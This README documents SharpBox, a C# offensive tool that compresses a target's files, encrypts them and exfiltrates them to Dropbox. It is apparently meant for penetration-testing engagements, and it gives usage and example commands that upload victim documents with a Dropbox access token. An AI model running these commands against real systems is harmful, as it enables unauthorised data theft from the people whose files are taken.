# SharpBox
SharpBox is a C# tool for compressing, encrypting, and exfiltrating data to Dropbox using the Dropbox API. 

## Compiling
Target Framework: NET3.5

The libraries added via NuGet for this project were:

- CommandLineParser.1.9.71

- Costura.Fody.1.6.2

- DotNetZip.1.11.0

- Fody.2.1.2


## Usage
Log into your Dropbox account and head over to the [Dropbox developer API explorer](https://dropbox.github.io/dropbox-api-v2-explorer/#auth_token/from_oauth1) page and get an oauth access token by clicking "Get Token".
These access tokens do not expire, but you can revoke them.  So I would recommend revoking tokens after being used on engagments.

Example:

```
SharpBox.exe -f "C:\Users\LegendaryJasonJF\Documents\management-docs" -t "DROPBOX-OATH-ACCESS-TOKEN-HERE" -o "C:\Users\Public\Archive.zip"

SharpBox.exe -f "C:\Users\Meatball\Documents\rip-doc.txt" -t "DROPBOX-OATH-ACCESS-TOKEN-HERE" -o "C:Users\Meatball\Desktop\rip.zip"
```

SharpBox can Zip a single file or folder of items. The compressed file is then encrypted with a randomly generated password and uploaded to Dropbox.  The password is output to the console.  Copy the password and use with the "password" argument when decrypting. 

```
SharpBox 1.1.0
Copyright c  2021 Pickles
Usage: SharpBox <options>

      -f, --path                   Required. path to the file or folder you wish to
                                   compress the contents of

      -o, --OutFile                Name of the compressed file

      -t, --dbxToken               Dropbox Access Token

      -h, --dbxPath                (Default: /test/data) path to dbx folder

      -d, --decrypt                (Default: False) Choose this to decrypt a zip or
                                   cabbed file previously encrypted by this tool.
                                   Requires original password argument.

      -p, --decryption-password    Password to decrypt a zipped or cabbed file.

      --help                       Display this help screen.
  ```
  
  
  Once the compressed/encrypted file is downloaded from Dropbox, you can use this tool to decrypt it as well. 
  
  Example: 
  
  ```
  SharpBox.exe -f "C:\Users\evilDude\Desktop\data" -o "C:\Users\evilDude\Desktop\decrypted-data.zip" -p "RandomlyGeneratedPassword" -d
  ```
  
 ## Acknowledgements
  
 - [@CptJesus](https://twitter.com/CptJesus) for letting me borrow the password gen snippet from [SharpHound](https://github.com/BloodHoundAD/SharpHound).
